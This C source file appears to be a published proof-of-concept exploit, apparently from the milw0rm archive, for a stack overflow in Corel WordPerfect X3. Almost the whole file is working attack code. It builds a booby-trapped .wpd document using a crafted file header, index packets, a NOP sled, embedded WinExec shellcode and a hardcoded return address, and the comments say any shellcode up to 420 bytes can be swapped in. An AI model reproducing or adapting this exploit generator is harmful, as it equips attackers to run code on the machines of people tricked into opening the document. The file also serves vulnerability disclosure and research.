/**
 * wp13exp.c - Wordperfect X3 remote exploit
 *
 * Proof of concept exploit for a stack based overflow in
 * Corel Wordperfext X3.  The vulnerability can be exploited
 * by tricking a user into opening a specially crafted document.
 * 
 * Usage:
 *
 * c:\win13exp evildoc.wpd
 *
 * Original advisory: http://www.nop-art.net/advisories/wpwin13.txt
 * Author: Jonathan So [ jonny [ @ ] nop-art.net ]
 */

#define WINDOWS
//#define LINUX

#ifdef WINDOWS
	#include <windows.h>
#endif
#include <stdio.h>

// Tested for Wordperfect X3 (13.0.0.565) on XP SP2
#define RET_ADDR 0x0012DF50

// Don't change these
#define PKT_INDEX_SIZE 14
#define HEADER_SIZE 512
#define PRINTSEL_PKT_SIZE 530
#define PRINTSEL_FAKE_SIZE 713
#define FONTDESC_PKT_SIZE 420

// WordPerfect file header
struct wp_header {
	unsigned char file_id[4];
	unsigned long doc_ptr;
	unsigned char product_type;
	unsigned char document_type;
	unsigned char major_version;
	unsigned char minor_version;
	unsigned short encryption;
	unsigned short index_ptr;
	unsigned char reserved[4];
	unsigned long file_size;
	unsigned char extended_header[488];
};

// Index for data packet
struct packet_index {
	unsigned char flags;
	unsigned char packet_type;
	unsigned short use_count;
	unsigned short hidden_count;
	unsigned long size;
	unsigned long data_ptr;
};

// This WinExec shellcode locates kernel32.dll using PEB method before
// calling WinExec (using the string at the end of the shellcode) and
// finally calling ExitProcess.  Should work for XP/2000/2003/NT but
// any shellcode should plug straight in, up to 420 bytes and it doesn't
// matter if it contain nulls. 
char shellcode[] =
	"\xb8\x7e\xd8\xe2\x73\x50\xe8\x21\x00\x00\x00\x83\xc4\x04\x50\xb8\x98\xfe\x8a\x0e\x50\xe8\x12\x00\x00\x00"
	"\x83\xc4\x04\x50\xeb\x62\x5e\x58\x6a\x00\x56\xff\xd0\x58\x6a\x00\xff\xd0\x33\xc0\x64\xa1\x30\x00\x00\x00"
	"\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x68\x08\x8b\x45\x3c\x8b\x54\x05\x78\x03\xd5\x8b\x5a\x20\x8b\x4a\x18\x03"
	"\xdd\xe3\x30\x49\x8b\x34\x8b\x03\xf5\x33\xff\x33\xc0\xfc\xac\x84\xc0\x74\x07\xc1\xcf\x0d\x03\xf8\xeb\xf4"
	"\x3b\x7c\x24\x04\x75\xe1\x8b\x5a\x24\x03\xdd\x66\x8b\x0c\x4b\x8b\x5a\x1c\x03\xdd\x8b\x04\x8b\x03\xc5\xc3"
	"\xe8\x99\xff\xff\xff" "cmd /c echo nop-art>c:\\test.txt && notepad c:\\test.txt\x00";

char fill_string[] = "nop-art.net";

void construct_header(struct wp_header* header) {
	int i;

	// These are constant for all Wordperfect documents
	header->file_id[0] = -1;
	header->file_id[1] = 'W';
	header->file_id[2] = 'P';
	header->file_id[3] = 'C';
	
	// Document header values
	header->doc_ptr = 0;
	header->product_type = 0x01;
	header->document_type = 0x0A;
	header->major_version = 0x02;
	header->minor_version = 0x01;
	header->encryption = 0x00;
	header->index_ptr = 0x0200;

	header->reserved[0] = 0x05;
	for (i=1;i<4;i++) {
		header->reserved[i] = 0x00;
	}

	header->file_size = 0;

	for (i=0;i<488;i++) {
		header->extended_header[i] = 0x00;
	}
}

void construct_document(FILE *fp, long ret_addr)
{
	// Index packets
	struct packet_index index[3] = {
		{ 0x02, 0x00, 0x03, 0x00, 0x00, 0x00 },
		{ 0x00, 0x55, 0x01, 0x00, 0x00, 0x00 },
		{ 0x08, 0x23, 0x01, 0x00, 0x00, 0x00 }
	};

	struct wp_header header;

	unsigned char fontdesc_packet[FONTDESC_PKT_SIZE];
	unsigned char printsel_packet[PRINTSEL_PKT_SIZE];
	char *char_ptr;
	int i;
	int offset;

	construct_header(&header);

	// Fill the font selection packet with NOP's
	for (i=0;i<FONTDESC_PKT_SIZE;i++) {
		fontdesc_packet[i] = 0x90;
	}

	// Set size and offset for index packets
	index[1].size = FONTDESC_PKT_SIZE;
	index[2].size = 713;
	index[2].data_ptr = HEADER_SIZE + (PKT_INDEX_SIZE * 3);
	index[1].data_ptr = index[2].data_ptr + PRINTSEL_PKT_SIZE;

	// Copy shellcode into the end of the font descriptor packet
	offset = index[1].size - sizeof(shellcode);
	for (i=0; i < sizeof(shellcode); i++) {
		fontdesc_packet[i + offset] = shellcode[i];
	}

	// Fill the printer selection packet with some data
	for (i=0; i < PRINTSEL_PKT_SIZE ; i++) {
		printsel_packet[i] = fill_string[i % sizeof(fill_string)];
	}

	// Add the return address on the end. Copied from a unicode buffer to non-unicode
	char_ptr = (char*) &ret_addr;
	for (i=8;i>0;i-=2) {
		printsel_packet[PRINTSEL_PKT_SIZE-i] = *char_ptr;
		printsel_packet[PRINTSEL_PKT_SIZE-(i-1)] = 0x00;
		char_ptr++;
	}

	// Set total file size and pointer to document body
	header.file_size = HEADER_SIZE + (PKT_INDEX_SIZE * 3) + PRINTSEL_PKT_SIZE + FONTDESC_PKT_SIZE;
	header.doc_ptr = header.file_size;

	// Now write all the data to file. Some compilers align structure members
	// on different size boundaries so we have to write them all separately
	fwrite((void*) &header.file_id, 4, 1, fp);
	fwrite((void*) &header.doc_ptr, 4, 1, fp);
	fwrite((void*) &header.product_type, 1, 1, fp);
	fwrite((void*) &header.document_type, 1, 1, fp);
	fwrite((void*) &header.major_version, 1, 1, fp);
	fwrite((void*) &header.minor_version, 1, 1, fp);
	fwrite((void*) &header.encryption, 2, 1, fp);
	fwrite((void*) &header.index_ptr, 2, 1, fp);
	fwrite((void*) &header.reserved, 4, 1, fp);
	fwrite((void*) &header.file_size, 4, 1, fp);
	fwrite((void*) &header.extended_header, 488, 1, fp);

	fwrite((void*) &index[0].flags, 1, 1, fp);
	fwrite((void*) &index[0].packet_type, 1, 1, fp);
	fwrite((void*) &index[0].use_count, 2, 1, fp);
	fwrite((void*) &index[0].hidden_count, 2, 1, fp);
	fwrite((void*) &index[0].size, 4, 1, fp);
	fwrite((void*) &index[0].data_ptr, 4, 1, fp);

	fwrite((void*) &index[1].flags, 1, 1, fp);
	fwrite((void*) &index[1].packet_type, 1, 1, fp);
	fwrite((void*) &index[1].use_count, 2, 1, fp);
	fwrite((void*) &index[1].hidden_count, 2, 1, fp);
	fwrite((void*) &index[1].size, 4, 1, fp);
	fwrite((void*) &index[1].data_ptr, 4, 1, fp);

	fwrite((void*) &index[2].flags, 1, 1, fp);
	fwrite((void*) &index[2].packet_type, 1, 1, fp);
	fwrite((void*) &index[2].use_count, 2, 1, fp);
	fwrite((void*) &index[2].hidden_count, 2, 1, fp);
	fwrite((void*) &index[2].size, 4, 1, fp);
	fwrite((void*) &index[2].data_ptr, 4, 1, fp);

	fwrite(printsel_packet, PRINTSEL_PKT_SIZE, 1, fp);
	fwrite(fontdesc_packet, FONTDESC_PKT_SIZE, 1, fp);

	fclose(fp);
}

int main (int argc, char **argv)
{
        FILE *fp;
        unsigned long ret_addr = RET_ADDR;

        if (argc < 2) {
                printf("Usage: %s <filename> [-r 0xdeadbeef]\n", argv[0]);
                printf(" -r <retaddr>         (0x%x default)\n", ret_addr);
                return 0;
        }

        if (argc >= 4) {
                if (memcmp(argv[2], "-r", strlen(argv[2]))==0) {
                        ret_addr = strtoul(argv[3], NULL, 0);
                }
        }

        if ((fp = fopen(argv[1], "wb")) == NULL) {
                printf("Error creating file: %s\n", argv[1]);
                return -1;
        }

        construct_document(fp, ret_addr);

        printf("Created document %s with return address [0x%x]\n", argv[1], ret_addr);

        return 0;
}

// milw0rm.com [2007-03-28]
